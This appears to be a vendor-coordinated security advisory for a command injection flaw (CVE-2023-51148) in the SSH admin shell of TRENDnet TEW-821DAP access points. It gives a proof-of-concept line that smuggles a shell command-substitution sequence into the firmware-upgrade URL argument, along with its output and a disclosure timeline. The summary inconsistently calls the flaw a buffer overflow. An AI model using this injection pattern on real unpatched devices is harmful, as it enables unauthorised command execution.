# Command injection in mycli (CVE-2023-51148) #

## Summary
We identified a buffer overflow vulnerability on TRENDnet AC1200 TEW-821DAP (v2.0R and v2.5R) device, firmware version 3.00b06. The `fwup` command of custom shell `mycli` on the affected device allows an attacker with valid SSH credentials to inject and execute arbitrary shell commands.

## Product
* TRENDnet AC1200 TEW-821DAP V2.0R (firmware 3.00b06)
* TRENDnet AC1200 TEW-821DAP V2.5R (firmware 3.00b06)

## Details
Shell `mycli` is set for the SSH admin console, but is vulnerable to a command injection issue. Specifically, due to the lack of input validation, attackers can include shell "command substitution" sequences in command `mgmt fwgrade fwup` to execute arbitrary commands on the underlying Linux system.

In detail, the `mgmt fwupgrade fwup` command is used to trigger a firmware upgrade. The syntax is the following:

```
mgmt fwupgrade fwup <url>
```

where `url` contains the URL of the new firmware to be installed on the device. This parameter is specified by the user and it is not properly sanitized before use.

## PoC

```
TEW-821DAP>> mgmt fwgrade fwup $(ls )
TEW-821DAP>> --2023-12-01 08:08:43-- http://bin/
Resolving bin... failed: Name or service not known.
wget: unable to resolve host address `bin'
|--2023-12-01 08:08:43-- http://dev/
Resolving dev... failed: Name or service not known.
wget: unable to resolve host address `dev'
|--2023-12-01 08:08:43-- http://etc/
Resolving etc... failed: Name or service not known.
wget: unable to resolve host address `etc'
|--2023-12-01 08:08:43-- http://export.sh/
Resolving export.sh... failed: Name or service not known.
wget: unable to resolve host address `export.sh'
http://https/
|--2023-12-01 08:08:43--
Resolving https... failed: Name or service not known.
wget: unable to resolve host address 'https'
|--2023-12-01 08:08:43-- http://lib/
Resolving lib... failed: Name or service not known.
wget: unable to resolve host address 'lib'
|--2023-12-01 08:08:43-- http://mnt/
Resolving mnt... failed: Name or service not known.
wget: unable to resolve host address 'mnt'
```

## Impact
By exploiting this vulnerability it could be possible to execute arbitrary commands on the device.
Note that, by default, the SSH service is exposed only on the LAN side; thus, unless a user intentionally exposes SSH on the WAN-side, this issue cannot be exploited remotely.

### Additional information

### Credit
Spike Reply Cybersecurity Team

### Disclosure timeline

- December 6, 2023: Initial vendor contact
- December 11, 2023: Vulnerability confirmed by TRENDnet
- January 2, 2024: TRENDnet shares a preview version of the firmware that includes the security fixes 3.02B04
- January 8, 2024: Spike confirms that security fixes included in firmware 3.02B04 are effective
- January 9, 2024: TRENDnet confirms that customers will be notified about the new firmware version
- March 8, 2024: Disclosure
